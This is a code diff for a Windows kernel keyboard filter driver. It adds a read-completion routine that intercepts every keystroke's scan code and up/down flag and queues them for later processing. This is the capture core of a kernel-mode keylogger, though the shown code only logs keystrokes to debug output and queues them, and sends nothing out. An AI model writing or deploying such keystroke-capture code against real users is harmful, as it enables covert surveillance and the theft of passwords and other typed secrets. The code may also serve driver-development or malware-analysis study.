@@ -3,7 +3,9 @@ extern "C" {
 }
 #include <kbdmou.h>
 #include "ntddkbd.h"
-#include "Kbd.h"
+#include "KbdHook.h"
+
+extern int numPendingIrps;
 
 NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject) {
 	DbgPrint("Entering Hook Routine..\n");
@@ -37,4 +39,34 @@ NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject) {
 	DbgPrint("Filter Device attached successfully.\n");
 
 	return STATUS_SUCCESS;
+}
+
+NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context) {
+	DbgPrint("Entering read complete.\n");
+
+	PDEVICE_EXTENSION pKeyboardDeviceObjectExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;
+
+	if (pIrp->IoStatus.Status == STATUS_SUCCESS) {
+		PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
+		int numKeys = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
+
+		for (int i = 0; i < numKeys; i++) {
+			DbgPrint("ScanCode: %x\n", keys[i].MakeCode);
+			if (keys[i].Flags == KEY_BREAK) DbgPrint("%s\n", "Key Up");
+			if (keys[i].Flags == KEY_MAKE) DbgPrint("%s\n", "Key Down");
+
+			KEY_DATA* kData = (KEY_DATA*)ExAllocatePool(NonPagedPool, sizeof(KEY_DATA));
+			kData->KeyData = (char)keys[i].MakeCode;
+			kData->KeyFlags = (char)keys[i].Flags;
+
+			DbgPrint("Adding IRP to work queue.");
+			ExInterlockedInsertTailList(&pKeyboardDeviceObjectExtension->QueueListHead, &kData->ListEntry, &pKeyboardDeviceObjectExtension->lockQueue);
+
+			KeReleaseSemaphore(&pKeyboardDeviceObjectExtension->semQueue, 0, 1, FALSE);
+		}
+	}
+
+	if (pIrp->PendingReturned) IoMarkIrpPending(pIrp);
+	numPendingIrps--;
+	return pIrp->IoStatus.Status;
 }
